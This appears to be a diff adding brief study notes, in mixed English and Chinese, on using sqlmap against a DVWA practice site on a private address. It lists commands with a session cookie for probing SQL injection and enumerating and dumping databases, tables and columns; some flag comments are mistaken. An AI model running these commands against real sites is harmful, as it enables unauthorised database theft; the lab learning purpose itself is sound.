@@ -1,0 +1,13 @@
+###Install the test website:DVWA###
+###Install sqlmap###
+
+1. ./sqlmap.py -u "http://192.168.60.140/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie "PHPSESSID=o3eh97t3iksuslo64di0n0h5k7;security=low" --current-db --current-user
+资料：http://www.freebuf.com/articles/web/29942.html (with something wrong)
+2.常用
+(1) ./sqlmap.py -u "http://192.168.60.140/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie "PHPSESSID=o3eh97t3iksuslo64di0n0h5k7;security=low" -b --current-db --current-user
+(2) --data ""    //post  data
+(3) -b --current-user --current-db
+(4) --dbs //show tables
+(5) --D database --tables //show tables
+(6) -D database -T table --columns //show columns
+(7) -D database -T table -C columnName,... --dump //get the specified columns of one table
